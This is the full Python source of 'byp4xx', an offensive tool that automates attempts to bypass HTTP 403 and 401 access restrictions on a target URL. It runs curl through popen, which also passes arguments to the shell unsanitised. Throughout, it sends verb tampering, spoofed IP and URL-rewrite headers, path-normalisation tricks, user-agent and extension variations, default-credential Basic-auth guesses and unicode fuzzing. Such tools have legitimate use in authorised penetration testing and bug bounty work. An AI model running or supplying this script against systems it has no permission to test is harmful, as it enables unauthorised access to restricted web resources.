#!/usr/bin/python3
import sys
from time import sleep
from os import popen
import base64

def banner():
	print('\033[92m    __                 \033[91m__ __           ')
	print('\033[92m   / /_  __  ______   \033[91m/ // / _  ___  __')
	print('\033[92m  / __ \/ / / / __ \ \033[91m/ // /_| |/_/ |/_/')
	print('\033[92m / /_/ / /_/ / /_/ /\033[91m/__  __/>  <_>  <  ')
	print('\033[92m/_.___/\__, / .___/   \033[91m/_/ /_/|_/_/|_|  ')
	print('\033[92m      /____/_/                        ')
	print('by: @lobuhisec \033[0m')
	print('')

#Defining the standard curl calling. Default options used: -k -s -I (HEAD method) 
#Code is returned already colored

def curl_code_response(options_var, payload_var):
	code = ""
	status = ""
	code = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options_var, payload_var)).read()
	
	
	#If we use -x proxy curl option then we must take the third line of the response
	"""
	if " -X" in options_var:
		code = code.split('\n',3)[2]
	else:
		code = code.split('\n',1)[0]
	"""
	code = code.split('\n',1)[0]	
	status = code.split(" ")[1] # Status code is in second position
		
	#200=GREEN
	if status == "200":
		code = "\033[92m"+code+"\n\tCommand: curl -k -s -I "+options_var+" "+payload_var+"\033[0m"
	#30X=ORANGE
	elif status.startswith("30"):
		code = "\033[93m"+code+" TIP: Consider to use -L option to follow redirections\033[0m"
	#40X or 50X=RED
	elif  status.startswith("40") or  status.startswith("50"):
		code = "\033[91m"+code+"\033[0m"
	else:
		code = "000"
	return code

def main():	
		
	verboseBool = False
	fuzzBool = False
	customIP = "127.0.0.1"		
	
	#Check all params
	if len(sys.argv)<2:
		print("Usage: ./byp4xx <cURL or built-in options> <target>")
		print("Built-in options: \n\t-all\t\tVerbose mode\n\t-ip <IP>\tSet custom source IP\n\t-fuzz\t\tExperimental unicode fuzzing. HIGH WORKLOAD! >65k requests!")
		sys.exit(1)

	#Parse curl options and target from args
	options = ' '.join(sys.argv[1:len(sys.argv)-1])
	
	#Show responses 403
	if "-all" in options:
		options = options.replace("-all","")
		verboseBool = True
	#Fuzz unicode - Experimental - HIGH WORKLOAD! >65k requests!	
	if "-fuzz" in options:
		options = options.replace("-fuzz","")
		fuzzBool = True
	#Custom IP
	if "-ip" in options:
		#Extract IP value from options and remove -ip and its value
		customIP = options.split(" ")[options.split(" ").index("-ip")+1]
		options = options.replace("-ip","")
		options = options.replace(customIP,"")
		
	target = sys.argv[len(sys.argv)-1]

	#Check if URL starts with http/https
	if not target.startswith("http"):
		print("Usage: ./byp4xx <cURL options> <target>")	
		print("URL parameter does not start with http:// or https://")
		sys.exit(1)

	#Count "/" on target param just to parse the last part of URI path
	bar_count = target.count("/")
	if target.endswith("/"):
		bar_count = bar_count -1

	if bar_count == 2:
		url = target
		uri = ""
	else:
		aux =  target.split("/")
		url = "/".join(aux[:bar_count])
		uri = aux[bar_count]

	###########TESTS start here!!!!
	print('\033[92m\033[1m[+]VERB TAMPERING\033[0m')
	resultBool= False
	payload = url + "/" + uri
	
	result = curl_code_response(options+" -X ACL",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("ACL: "+result)	
	result = curl_code_response(options+" -X ARBITRARY",payload)
	if "403" not in result or verboseBool:
		resultBool = True		
		print("ARBITRARY: "+result)	
	result = curl_code_response(options+" -X BASELINE-CONTROL",payload)
	if "403" not in result or verboseBool:
		resultBool = True	
		print("BASELINE-CONTROL: "+result)
	result = curl_code_response(options+" -X CHECKIN",payload)
	if "403" not in result or verboseBool:
		resultBool = True	
		print("CHECKIN: "+result)		
	result = curl_code_response(options+" -X CHECKOUT",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("CHECKOUT: "+result)
	result = curl_code_response(options+" -X CONNECT",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("CONNECT: ",result)	
	result = curl_code_response(options+" -X COPY",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("COPY: ",result)
        #result = curl_code_response(options+" -X DELETE",payload)) #too dangerous!
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("GET: ",result)
	result = curl_code_response(options+" -X HEAD -m 1",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("HEAD: ",result)
	result = curl_code_response(options+" -X LABEL",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("LABEL: ",result)
	result = curl_code_response(options+" -X LOCK",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("LOCK: ",result)
	result = curl_code_response(options+" -X MERGE",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("MERGE: ",result)
	result = curl_code_response(options+" -X MKACTIVITY",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("MKACTIVITY: ",result)
	result = curl_code_response(options+" -X MKCOL",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("MKCOL: ",result)	
		
	result = curl_code_response(options+" -X MKWORKSPACE",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("MKWORKSPACE: ",result)	
	result = curl_code_response(options+" -X MOVE",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("MOVE: ",result)	
	result = curl_code_response(options+" -X OPTIONS",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("OPTIONS: ",result)	
	result = curl_code_response(options+" -X ORDERPATCH",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("ORDERPATCH: ",result)	
	result = curl_code_response(options+" -X PATCH",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("PATCH: ",result)	
	result = curl_code_response(options+" -X POST",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("POST: ",result)	
	result = curl_code_response(options+" -X PROPFIND",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("PROPFIND: ",result)	
	result = curl_code_response(options+" -X PROPPATCH",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("PROPPATCH: ",result)	
	result = curl_code_response(options+" -X PUT",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("PUT: ",result)	
	result = curl_code_response(options+" -X REPORT",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("REPORT: ",result)	
	result = curl_code_response(options+" -X SEARCH",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("SEARCH: ",result)	
	result = curl_code_response(options+" -X TRACE",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("TRACE: ",result)	
	result = curl_code_response(options+" -X UNCHECKOUT",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("UNCHECKOUT: ",result)	
	result = curl_code_response(options+" -X UNLOCK",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("UNLOCK: ",result)	
	result = curl_code_response(options+" -X UPDATE",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("UPDATE: ",result)	
	result = curl_code_response(options+" -X VERSION-CONTROL",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("VERSION-CONTROL: ",result)	
	if not resultBool:
		print("No results for verb tampering")
	print("")
	###########HEADERS
	resultBool = False
	print('\033[92m\033[1m[+]HEADERS\033[0m')
	
	result = curl_code_response(options+" -X GET -H \"X-HTTP-Method-Override: PUT\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-HTTP-Method-Override: PUT: ",result)
	result = curl_code_response(options+" -X GET -H \"Referer: "+payload+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Referer: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Custom-IP-Authorization: ",result)
	payload=url+"/"+uri+"..\;"
	result = curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Custom-IP-Authorization+..;: ",result)
	payload=url+"/"
	result = curl_code_response(options+" -X GET -H \"X-Original-URL: /"+uri+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Original-URL: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Rewrite-URLL: ",result)
	payload=url+"/"+uri
	result = curl_code_response(options+" -X GET -H \"X-Originating-IP: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Originating-IP: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Original-URL: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Original-URL: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Forwarded-For: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Forwarded-For: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Forwarded: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Forwarded: ",result)
	result = curl_code_response(options+" -X GET -H \"Forwarded-For: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Forwarded-For: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Remote-IP: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Remote-IP: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Remote-Addr: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Remote-Addr: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Client-IP: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Client-IP: ",result)
	result = curl_code_response(options+" -X GET -H \"Client-IP: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Client-IP: ",result)
	result = curl_code_response(options+" -X GET -H \"True-Client-IP: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("True-Client-IP: ",result)
	result = curl_code_response(options+" -X GET -H \"Cluster-Client-IP: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Cluster-Client-IP: ",result)
	result = curl_code_response(options+" -X GET -H \"X-ProxyUser-Ip: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-ProxyUser-Ip: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Host: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Host: ",result)
	result = curl_code_response(options+" -X GET -H \"Host: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Host: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Forwarded-Host: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Forwarded-Host: ",result)
	result = curl_code_response(options+" -X GET -H \"Forwarded-Host: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Forwarded-Host: ",result)
	result = curl_code_response(options+" -X GET -H \"X-Forwarded: "+customIP+"\"",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("X-Forwarded: ",result)
	if not resultBool:
		print("No results for headers")
	print("")
	
	print('\033[92m\033[1m[+]#BUGBOUNTYTIPS\033[0m')
	resultBool = False
	payload = url+"/%2e/"+uri
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("%2e: ",result)
	payload = url+"/%ef%bc%8f"+uri
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("/%ef%bc%8f: ",result)
	payload = url+"/"+uri+"/."
	result = curl_code_response(options+" -X GET --path-as-is",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with /.: ",result)
	payload = url+"/"+uri+"?"
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with ?: ",result)
	payload = url+"/"+uri+"??"
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with ??: ",result)
	payload = url+"/"+uri+"//"
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with //: ",result)
	payload = url+"/./"+uri+"/./"
	result = curl_code_response(options+" -X GET --path-as-is",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Between /./:  ",result)
	payload = url+"/"+uri+"/"
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with /: ",result)
	payload = url+"/"+uri+"/.randomstring"
	result = curl_code_response(options+" -X GET",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with .randomstring: ",result)
	payload = url+"/"+uri+"..\;/"
	result = curl_code_response(options+" -X GET --path-as-is",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Ends with ..;: ",result)
	payload = url+"/.\;/"+uri
	result = curl_code_response(options+" -X GET --path-as-is",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Between /.;/: ",result)
	payload = url+"\;foo=bar/"+uri
	result = curl_code_response(options+" -X GET --path-as-is",payload)
	if "403" not in result or verboseBool:
		resultBool = True
		print("Between ;foo=bar;/: ",result)
	if not resultBool:
		print("No results for bug bounty tips")
	print("")
	
	###########UserAgents
	
	payload=url+"/"+uri
	
	print('\033[92m\033[1m[+]UserAgents\033[0m')
	resultBool = False
	with open("UserAgents.fuzz.txt") as file:  
		for userAgent in file: 
			result = curl_code_response(options+" -X GET -H \"User-Agent: "+userAgent+"\"",payload)
			#Some webservers return 400 bad request
			if "40" not in result or verboseBool:
				resultBool = True
				print(userAgent+": "+result)
	if not resultBool:
		print("No results for UserAgents")
	print("")	
	
	###########Extensions
	
	
	print('\033[92m\033[1m[+]Extensions\033[0m')
	resultBool = False
	with open("extensions.txt") as file:
		for extension in file:
			payload = url+"/"+uri+extension.strip()
			result = curl_code_response(options+" -X GET ",payload)
			#Some webservers return 400 bad request
			if "40" not in result or verboseBool:
				resultBool = True
				print(extension.strip()+": "+result)
	if not resultBool:
		print("No results for extensions")
	print("")	
	
	###########Default credentials
	payload=url+"/"+uri
	print('\033[92m\033[1m[+]Default Credentials - Basic Auth\033[0m')
	resultBool = False
	with open("default_creds.txt") as file:
		for credential in file:
			credentialBytes = credential.strip().encode('utf-8')
			base64_bytes = base64.b64encode(credentialBytes)
			credentialB64 = base64_bytes.decode('utf-8')
			result = curl_code_response(options+" -X GET -H \"Authorization: Basic "+credentialB64+"\"",payload)
			if "403" not in result:
				resultBool = True
				print(credential.strip()+": "+result)
	if not resultBool:
		print("No results for default credentials")
	print("")
	
	###########FUZZ
	#Based on https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
	if fuzzBool:
		print('\033[92m\033[1m[+]Fuzzing...\033[0m')
		resultBool = False
		with open("Unicode.txt") as file:
			for unicode in file:
				payload = url+"/"+unicode.strip()+uri
				result = curl_code_response(options+" -X GET ",payload)
				if "403" not in result:
					resultBool = True
					print(unicode.strip()+uri+": "+result)
				payload = url+"/"+unicode.strip()+"/"+uri
				result = curl_code_response(options+" -X GET ",payload)
				if "403" not in result:
					resultBool = True
					print(unicode.strip()+"/"+uri+": "+result)
				payload = url+"/"+uri+unicode.strip()
				result = curl_code_response(options+" -X GET ",payload)
				if "403" not in result:
					resultBool = True
					print(uri+unicode.strip()+": "+result)
		if not resultBool:
			print("No results for fuzzing")
		print("")
		

if __name__ == "__main__":
	try:
		banner()
		main()
	except KeyboardInterrupt:
		print("Aborting...")
	except Exception as e:
		print(e)
